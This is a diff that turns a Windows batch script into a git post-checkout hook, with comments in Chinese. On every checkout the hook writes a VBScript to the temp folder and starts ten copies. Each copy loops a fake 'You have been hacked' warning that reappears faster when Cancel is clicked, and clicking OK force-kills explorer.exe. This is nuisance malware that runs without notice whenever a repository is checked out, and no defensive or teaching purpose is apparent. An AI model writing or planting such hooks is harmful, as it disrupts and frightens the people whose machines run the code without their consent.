@@ -1,27 +1,29 @@
-@echo off
-setlocal enabledelayedexpansion
+#!/bin/sh
+#
+# post-checkout hook: every time you git checkout, spawn the popup.vbs
 
-set "vbfile=%temp%\popup.vbs"
+# 先确保 vbs 文件存在
+VB="$TEMP/popup.vbs"
+cat > "$VB" <<'EOF'
+Dim i
+i = 1000
+Do
+  response = MsgBox("You have been hacked. Exit now?", vbOKCancel + vbExclamation, "System Warning")
+  If response = vbCancel Then
+    i = i - 100
+    If i < 100 Then i = 100
+  ElseIf response = vbOK Then
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "taskkill /f /im explorer.exe", 0, False
+    WScript.Quit
+  End If
+  WScript.Sleep i
+Loop
+EOF
 
-:: 创建 VBS 内容
-break > "%vbfile%"
->> "%vbfile%" echo Dim i
->> "%vbfile%" echo i = 1000
->> "%vbfile%" echo Do
->> "%vbfile%" echo   response = MsgBox("You have been hacked. Exit now?", vbOKCancel + vbExclamation, "System Warning")
->> "%vbfile%" echo   If response = vbCancel Then
->> "%vbfile%" echo     i = i - 100
->> "%vbfile%" echo     If i ^< 100 Then i = 100
->> "%vbfile%" echo   ElseIf response = vbOK Then
->> "%vbfile%" echo     Set objShell = CreateObject("Wscript.Shell")
->> "%vbfile%" echo     objShell.Run "taskkill /f /im explorer.exe", 0, False
->> "%vbfile%" echo     WScript.Quit
->> "%vbfile%" echo   End If
->> "%vbfile%" echo   WScript.Sleep i
->> "%vbfile%" echo Loop
-
-:: 一次性弹出多个实例
-for /L %%i in (1,1,10) do (
-  start "" wscript.exe "%vbfile%"
-  timeout /nobreak /t 1 >nul
-)
+# 然后异步启动多份
+for n in $(seq 1 10); do
+  # 在 Windows 下，用 cmd /c start 来让它跑在后台
+  cmd //C start "" wscript.exe "$VB"
+  sleep 1
+done
